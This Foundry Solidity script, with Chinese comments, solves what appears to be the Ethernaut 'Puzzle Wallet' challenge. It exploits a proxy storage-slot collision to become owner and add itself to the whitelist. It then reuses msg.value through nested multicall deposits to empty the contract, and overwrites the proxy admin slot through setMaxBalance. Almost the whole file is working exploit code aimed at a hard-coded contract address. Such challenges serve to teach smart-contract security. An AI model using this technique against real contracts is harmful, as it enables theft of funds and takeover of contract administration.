// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
}

contract PuzzleWalletAttackScript is Script {
    function run() external {
        // 填你的 Puzzle Wallet 实例地址，不是关卡地址
        address puzzleProxyLevel = 0xFA525212b5bDE0D2e902b16B7736532853b80F3b;

        IPuzzleProxy proxy = IPuzzleProxy(puzzleProxyLevel);
        IPuzzleWallet wallet = IPuzzleWallet(puzzleProxyLevel);

        vm.startBroadcast();

        address player = msg.sender;

        // 1) 利用 storage slot 0 冲突
        //    Proxy.pendingAdmin 和 Wallet.owner 都在 slot 0
        //    表面上是设置 pendingAdmin，实际也把 wallet.owner 改成 player
        proxy.proposeNewAdmin(player);

        // 2) 现在 player 已经是 Wallet 视角下的 owner，可以把自己加入白名单
        wallet.addToWhitelist(player);

        // 3) 利用 multicall + delegatecall 重复复用 msg.value
        //    关卡实例通常已经有一笔 ETH，存入同等数量后，通过两次 deposit 记两份账
        uint256 balanceBefore = puzzleProxyLevel.balance;
        require(balanceBefore > 0, "instance balance is 0");

        bytes memory depositData = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory innerData = new bytes[](1);
        innerData[0] = depositData;

        bytes[] memory outerData = new bytes[](2);
        outerData[0] = depositData;
        outerData[1] = abi.encodeWithSelector(wallet.multicall.selector, innerData);

        wallet.multicall{value: balanceBefore}(outerData);

        // 4) 此时合约真实余额 = 原余额 + 本次转入金额
        //    但 balances[player] 被记了两次，刚好可以提空整个合约
        uint256 balanceToDrain = puzzleProxyLevel.balance;
        wallet.execute(player, balanceToDrain, "");

        // 5) 合约余额为 0 后，调用 setMaxBalance
        //    Wallet.maxBalance 和 Proxy.admin 都在 slot 1
        //    把 maxBalance 写成 player 地址，即可覆盖 proxy.admin
        wallet.setMaxBalance(uint256(uint160(player)));

        vm.stopBroadcast();

        console.log("new proxy admin:", proxy.admin());
        console.log("expected player:", player);
    }
}
